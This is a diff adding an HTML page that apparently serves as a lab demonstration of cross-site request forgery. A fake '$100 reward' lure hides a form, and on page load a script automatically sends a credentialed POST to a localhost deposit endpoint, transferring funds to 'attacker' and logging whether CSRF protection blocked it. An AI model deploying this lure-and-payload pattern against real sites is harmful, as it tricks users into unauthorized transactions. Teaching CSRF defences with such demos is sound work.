@@ -1,0 +1,124 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>🎁 Claim Your Reward</title>
+    <style>
+      body {
+        font-family: "Segoe UI", sans-serif;
+        background-color: #fffbe6;
+        margin: 0;
+        padding: 0;
+        text-align: center;
+      }
+      header {
+        background-color: #ffa500;
+        color: white;
+        padding: 1rem;
+      }
+      .card {
+        margin-top: 3rem;
+        background: white;
+        display: inline-block;
+        padding: 2rem;
+        border-radius: 8px;
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+      }
+      img {
+        width: 300px;
+        margin: 1rem 0;
+      }
+      .log {
+        background: #000;
+        color: #0f0;
+        font-family: monospace;
+        padding: 1rem;
+        max-width: 500px;
+        margin: 2rem auto;
+        border-radius: 5px;
+        text-align: left;
+        height: 150px;
+        overflow-y: auto;
+      }
+      .hidden {
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <header>
+      <h1>🎉 Congratulations!</h1>
+    </header>
+
+    <div class="card">
+      <h2>You’ve won a $100 reward!</h2>
+      <img src="giftcard.jpg" alt="Gift Card" />
+      <p>We're verifying your account...</p>
+    </div>
+
+    <form id="csrfForm" class="hidden" action="http://localhost:3001/deposit" method="POST" target="hidden_iframe">
+      <input type="hidden" name="to" value="attacker">
+      <input type="hidden" name="amount" value="1000">
+    </form>
+    <iframe name="hidden_iframe" class="hidden"></iframe>
+
+    <div class="log" id="logBox">
+      &gt; 🛠️ Developer Panel (Demo only)<br>
+    </div>
+
+    <script>
+      // Append a nicely formatted log line to the developer panel
+      function log(msg) {
+        const box = document.getElementById("logBox");
+        const escaped = String(msg)
+          .replace(/&/g, "&amp;")
+          .replace(/</g, "&lt;")
+          .replace(/>/g, "&gt;");
+        box.innerHTML += "&gt; " + escaped + "<br>";
+        box.scrollTop = box.scrollHeight;
+      }
+
+      async function triggerCSRF() {
+        log("Preparing CSRF attack (fetch POST)...");
+        // Read the hidden form values (so attacker page remains editable)
+        const form = document.getElementById("csrfForm");
+        const to = form.querySelector('input[name="to"]').value;
+        const amount = form.querySelector('input[name="amount"]').value;
+
+        // Use fetch() so we can inspect the response and log success/failure
+        try {
+          const res = await fetch("http://localhost:3001/deposit", {
+            method: "POST",
+            credentials: "include",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ to, amount })
+          });
+
+          const text = await res.text();
+
+          if (res.ok) {
+            log("✅ Server responded (OK): " + text);
+          } else {
+            // Non-2xx status - attack blocked or error
+            log("❌ CSRF attack blocked (HTTP " + res.status + ") — the server rejected this request due to missing/invalid CSRF token.");
+          }
+        } catch (err) {
+          log("❌ Network error/fetch failed: " + err.message);
+        }
+      }
+
+      // Keep the original form available (hidden) but use fetch attack for clearer logs
+      window.addEventListener("load", () => {
+        log("Page loaded.");
+        // Delay briefly to simulate realistic user wait, then trigger
+        setTimeout(() => {
+          triggerCSRF();
+        }, 1200);
+      });
+    </script>
+  </body>
+</html>
